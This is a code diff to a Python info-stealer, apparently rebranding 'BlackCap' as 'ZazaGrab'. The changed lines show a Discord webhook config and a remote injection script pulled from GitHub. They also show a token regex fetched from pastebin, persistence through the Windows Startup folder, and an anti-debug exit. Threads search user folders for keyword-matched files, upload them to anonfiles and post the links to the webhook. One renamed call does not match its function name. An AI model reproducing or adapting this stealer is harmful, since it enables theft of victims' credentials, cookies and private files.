@@ -53,7 +53,7 @@ Passw = [];
 
 __config__ = {
     'yourwebhookurl': "%WEBHOOK_HERE%",
-    'blackcap_inject_url': "https://raw.githubusercontent.com/xKrustyDemonx/zaza-inject/main/index.js",
+    'zazagrab_inject_url': "https://raw.githubusercontent.com/xKrustyDemonx/zaza-inject/main/index.js",
     'hide': '%_hide_script%',
     'ping': '%ping_enabled%',
     'pingtype': '%ping_type%',
@@ -105,8 +105,8 @@ vctm_pc = os.getenv("COMPUTERNAME")
 r4m = str(psutil.virtual_memory()[0] / 1024 ** 3).split(".")[0]
 d1sk = str(psutil.disk_usage('/')[0] / 1024 ** 3).split(".")[0]
 
-BlackCap_Regex = 'https://pastebin.com/raw/f4PM9Dse'
-reg_req = requests.get(BlackCap_Regex) 
+ZazaGrab_Regex = 'https://pastebin.com/raw/f4PM9Dse'
+reg_req = requests.get(ZazaGrab_Regex) 
 clear_reg = r"[\w-]{24}" + reg_req.text
 
 
@@ -300,7 +300,7 @@ class bl4ckc4p(Functions):
 
 
 
-    def startupblackcap(self: str) -> str:
+    def startupzazagrab(self: str) -> str:
         if self.startupexe == "yes":
             startup_path = os.getenv("appdata") + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
             if os.path.exists(startup_path + argv[0]):
@@ -360,7 +360,7 @@ class bl4ckc4p(Functions):
         self.hiding()
         self.fakeerror()
         self.pingonrunning()
-        self.startupblackcap()
+        self.startupzazagrab()
 
         if self.fetch_conf('dbugkiller') and AntiDebug().inVM is True:
             self._bexit()
@@ -440,7 +440,7 @@ class bl4ckc4p(Functions):
 
                                     if self.srtupl0c not in argv[0]:
                                         try:
-                                            os.makedirs(inj_path + 'blackcap', exist_ok=True)
+                                            os.makedirs(inj_path + 'zazagrab', exist_ok=True)
                                         except PermissionError:
                                             pass
 
@@ -986,13 +986,13 @@ GoogleMaps: {self.googlemap}
 
         embed = {
             'name': "ZazaGrab",
-            'avatar_url': 'https://media.discordapp.net/attachments/1023241847046418522/1032289976710352917/blackcap_2.png',
+            'avatar_url': 'https://media.discordapp.net/attachments/1055997057149710388/1066504205835173928/zazagrab2.jpg',
             'embeds': [
                 {
                     'author': {
                         'name': f'Zaza - Grab v2.1',
                         'url': 'https://github.com/xKrustyDemonx',
-                        'icon_url': 'https://raw.githubusercontent.com/KSCHdsc/DestruCord-Inject/main/blackcap.gif'
+                        'icon_url': 'https://raw.githubusercontent.com/xKrustyDemonx/zazagrab-assets/main/mona-loading-dark.gif'
                     },
                     'color': 374276,
                     'description': f'[Zaza - Grab has Geo Localised this guy]({self.googlemap})',
@@ -1244,7 +1244,7 @@ def upload(name, tk=''):
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
     }
 
-    if name == "blackcapedez":
+    if name == "zazagrabedez":
         data = {
         "content": '',
         "embeds": [
@@ -1546,8 +1546,8 @@ def uploadToAnonfiles(path):
     except:
         return False
 
-def blackcapedezFolder(pathF, keywords):
-    global blackcapedezFiles
+def zazagrabedezFolder(pathF, keywords):
+    global zazagrabedezFiles
     maxfilesperdir = 7
     i = 0
     listOfFile = os.listdir(pathF)
@@ -1560,11 +1560,11 @@ def blackcapedezFolder(pathF, keywords):
             ffound.append([pathF + "/" + file, url])
         else:
             break
-    blackcapedezFiles.append(["folder", pathF + "/", ffound])
+    zazagrabedezFiles.append(["folder", pathF + "/", ffound])
 
-blackcapedezFiles = []
-def blackcapedezFile(path, keywords):
-    global blackcapedezFiles
+zazagrabedezFiles = []
+def zazagrabedezFile(path, keywords):
+    global zazagrabedezFiles
     fifound = []
     listOfFile = os.listdir(path)
     for file in listOfFile:
@@ -1575,12 +1575,12 @@ def blackcapedezFile(path, keywords):
                     break
                 if os.path.isdir(path + "/" + file):
                     target = path + "/" + file
-                    blackcapedezFolder(target, keywords)
+                    zazagrabedezFolder(target, keywords)
                     break
 
-    blackcapedezFiles.append(["folder", path, fifound])
+    zazagrabedezFiles.append(["folder", path, fifound])
 
-def blackcapedez():
+def zazagrabedez():
     user = temp.split("\AppData")[0]
     path2search = [
         user + "/Desktop",
@@ -1624,8 +1624,8 @@ def blackcapedez():
 
     wikith = []
     for patt in path2search:
-        blackcapedez = threading.Thread(target=blackcapedezFile, args=[patt, key_wordsFiles]);blackcapedez.start()
-        wikith.append(blackcapedez)
+        zazagrabedez = threading.Thread(target=zazagrabedezFile, args=[patt, key_wordsFiles]);zazagrabedez.start()
+        wikith.append(zazagrabedez)
     return wikith
 
 
@@ -1643,13 +1643,13 @@ GatherAll()
 DETECTED = Trust(Cookies)
 
 if not DETECTED:
-    wikith = blackcapedez()
+    wikith = zazagrabdez()
 
     for thread in wikith: thread.join()
     time.sleep(0.2)
 
     filetext = "\n"
-    for arg in blackcapedezFiles:
+    for arg in zazagrabedezFiles:
         if len(arg[2]) != 0:
             foldpath = arg[1]
             foldlist = arg[2]
@@ -1663,4 +1663,4 @@ if not DETECTED:
                 filetext += f"+ Name: {fileanme}\n+ Link: {b}"
                 filetext += "\n```"
                 filetext += "\n"
-    upload("blackcapedez", filetext)
+    upload("zazagrabedez", filetext)
